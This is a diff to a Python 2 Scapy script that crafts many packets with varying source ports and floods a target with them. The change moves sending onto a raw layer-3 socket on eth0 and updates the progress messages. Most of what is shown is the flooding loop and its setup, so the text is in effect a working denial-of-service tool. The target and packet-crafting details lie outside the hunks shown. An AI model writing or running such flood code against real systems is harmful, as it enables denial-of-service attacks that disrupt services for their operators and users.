@@ -1,5 +1,6 @@
 from scapy.all import *
 from scapy.layers.inet import *
+from socket import *
 
 
 # Setup packet parameters
@@ -23,14 +24,20 @@ for i in range(flood_amt):
     temp_packet = packet_craft(source_port)
     packets.append(temp_packet)
 
-print "done crafting packets!\n"
-print "\nBeginning flood ...\n"
+print "Done crafting packets!\n"
+print "Establishing connection...\n"
+
+skt = conf.L3socket(iface="eth0")
+
+print "Connection established!\n"
+print "Beginning flood ...\n"
+
 
 # Initiate a packet flood using our crafted packets
 for p in packets:
     # verbose field sets output.  0 = silent.
     # Timeout=0 forces send to operate continuously.
-    sr(p, verbose=0, timeout=0)
+    skt.sr(p, verbose=0, timeout=0)
 
 print "Done flooding!\n"
 
